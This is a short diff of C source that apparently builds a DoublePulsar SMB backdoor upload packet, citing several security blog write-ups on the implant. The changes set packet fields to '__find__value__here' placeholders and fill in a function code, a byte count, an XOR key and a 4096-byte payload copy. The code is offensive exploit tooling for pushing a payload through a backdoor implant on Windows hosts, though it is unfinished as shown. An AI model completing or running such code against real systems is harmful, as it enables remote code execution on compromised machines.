@@ -1,7 +1,7 @@
 //https://blog.rapid7.com/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
 //https://www.forcepoint.com/blog/x-labs/evasions-used-shadow-brokers-tools-danderspritz-and-doublepulsar-part-2-2
 //https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
-/https://www.secpod.com/blog/doublepulsar-a-very-sophisticated-payload-for-windows/
+//https://www.secpod.com/blog/doublepulsar-a-very-sophisticated-payload-for-windows/
 
 //types: https://docs.microsoft.com/en-us/cpp/cpp/data-type-ranges?view=vs-2019
 //https://docs.microsoft.com/en-us/cpp/c-runtime-library/standard-types?view=vs-2019
@@ -101,15 +101,16 @@ int sendStuff()
       
       uploadpacket.ParamCountTotal = 1;
       uploadpacket.DataCountTotal = 0;
-      uploadpacket.ParamCountMax = 
-      uploadpacket.DataCountMax = 
-      uploadpacket.ParamCount = 
-      uploadpacket.ParamOffset = 
+      uploadpacket.ParamCountMax = __find__value__here
+      uploadpacket.DataCountMax = __find__value__here
+      uploadpacket.ParamCount = __find__value__here
+      uploadpacket.ParamOffset = __find__value__here
       uploadpacket.DataCount = 0;
-      uploadpacket.DataOffset = 
-      uploadpacket.SetupCount = 
-      uploadpacket.SetupData = 
-      uploadpacket.byteCount = 4096;
+      uploadpacket.DataOffset = __find__value__here
+      uploadpacket.SetupCount = __find__value__here
+      uploadpacket.SetupData = __find__value__here
+      uploadpacket.function = 0x0e00;
+      uploadpacket.byteCount = 4109;
       memcpy(uploadpacket.SESSION_DATA_PARAMETERS, "GIBBERISH" , 8);
       memcpy(uploadpacket.SESSION_DATA_PARAMETERS, CHAR_XOR_KEY, 4);
       memcpy(uploadpacket.payload, data, 4096);
